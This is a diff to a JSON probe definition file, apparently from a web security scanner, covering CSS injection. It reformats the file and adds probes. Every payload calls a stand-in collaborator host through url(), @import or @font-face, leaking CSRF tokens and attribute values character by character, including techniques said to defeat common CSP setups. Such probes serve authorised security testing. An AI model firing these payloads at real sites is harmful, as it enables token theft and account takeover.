@@ -1,46 +1,133 @@
 {
-  "category": "css_injection",
-  "contexts": {
-    "data_exfiltration": {
-      "description": "CSS injection for data exfiltration -- use CSS selectors and url() to leak page content character by character to attacker server",
-      "tech_match": ["CSS", "HTML"],
-      "param_match": ["style", "css", "color", "background", "theme", "template", "class"],
-      "probes": [
-        {
-          "payload": "background:url(https://COLLABORATOR/?css-inject)",
-          "description": "Basic CSS injection probe -- if value appears in style attribute or <style> block, confirms CSS injection via OOB callback",
-          "matchers": [
-            {"type": "reflection", "check_variants": true}
-          ],
-          "severity": "medium",
-          "confidence_boost": 40
-        },
-        {
-          "payload": "};@import url(https://COLLABORATOR/?css-import);.x{",
-          "description": "@import injection -- close existing rule and inject external stylesheet import for full CSS control",
-          "matchers": [
-            {"type": "reflection", "check_variants": true}
-          ],
-          "severity": "high",
-          "confidence_boost": 50
-        }
-      ]
+ "category": "css_injection",
+ "contexts": {
+  "data_exfiltration": {
+   "description": "CSS injection for data exfiltration -- use CSS selectors and url() to leak page content character by character to attacker server",
+   "tech_match": [
+    "CSS",
+    "HTML"
+   ],
+   "param_match": [
+    "style",
+    "css",
+    "color",
+    "background",
+    "theme",
+    "template",
+    "class"
+   ],
+   "probes": [
+    {
+     "payload": "background:url(https://COLLABORATOR/?css-inject)",
+     "description": "Basic CSS injection probe -- if value appears in style attribute or <style> block, confirms CSS injection via OOB callback",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "medium",
+     "confidence_boost": 40
     },
-    "attribute_selector_exfil": {
-      "description": "CSS attribute selector exfiltration -- leak CSRF tokens, input values, or hidden field content via CSS selectors with url() callbacks",
-      "tech_match": ["CSS", "HTML"],
-      "param_match": ["style", "css", "theme"],
-      "probes": [
-        {
-          "payload": "input[name=csrf][value^=a]{background:url(https://COLLABORATOR/?v=a)}",
-          "description": "CSRF token exfiltration via CSS attribute selector -- fires callback when token starts with 'a'. Repeat for each character position to extract full token.",
-          "matchers": [
-            {"type": "reflection", "check_variants": true}
-          ],
-          "severity": "high",
-          "confidence_boost": 55
-        }
-      ]
+    {
+     "payload": "};@import url(https://COLLABORATOR/?css-import);.x{",
+     "description": "@import injection -- close existing rule and inject external stylesheet import for full CSS control",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 50
     }
+   ]
+  },
+  "attribute_selector_exfil": {
+   "description": "CSS attribute selector exfiltration -- leak CSRF tokens, input values, or hidden field content via CSS selectors with url() callbacks",
+   "tech_match": [
+    "CSS",
+    "HTML"
+   ],
+   "param_match": [
+    "style",
+    "css",
+    "theme"
+   ],
+   "probes": [
+    {
+     "payload": "input[name=csrf][value^=a]{background:url(https://COLLABORATOR/?v=a)}",
+     "description": "CSRF token exfiltration via CSS attribute selector -- fires callback when token starts with 'a'. Repeat for each character position to extract full token.",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 55
+    },
+    {
+     "payload": "</style><style>@import url(https://COLLABORATOR/import)</style>",
+     "description": "Sequential @import chaining (SIC) \u2014 a staging stylesheet exfiltrates data character-by-character without a page reload; COLLABORATOR receives each stage.",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 60
+    },
+    {
+     "payload": "<style>@font-face{font-family:x;src:url(https://COLLABORATOR/f?A);unicode-range:U+0041}#app{font-family:x}</style>",
+     "description": "@font-face unicode-range char exfil \u2014 the font is fetched only if a matching glyph is rendered; usable when img-src blocks url() but font-src does not.",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 55
+    },
+    {
+     "payload": "x;--v:attr(data-x);--s:if(style(--v: '1'): url(https://COLLABORATOR/1); else: url(https://COLLABORATOR/2));background:image-set(var(--s))",
+     "description": "CSS if()/attr() style-attribute exfil \u2014 leaks an attribute value with no selector and no stylesheet import (2025 Chrome inline-style technique).",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 50
+    },
+    {
+     "payload": "<style>@import url(https://COLLABORATOR/r)</style>",
+     "description": "Chained @import-redirect DOM exfiltration (CVE-2026-2441 class) \u2014 sequential redirect-driven requests defeat common CSP configurations.",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 50
+    },
+    {
+     "payload": "input[name=csrf-token][value^=a]+input{background:url(https://COLLABORATOR/?q=a)}",
+     "description": "Adjacent-sibling attribute-selector exfil \u2014 leaks a CSRF-token prefix via a neighbouring element's background; repeat per character position.",
+     "matchers": [
+      {
+       "type": "reflection",
+       "check_variants": true
+      }
+     ],
+     "severity": "high",
+     "confidence_boost": 55
+    }
+   ]
   }
+ }
 }
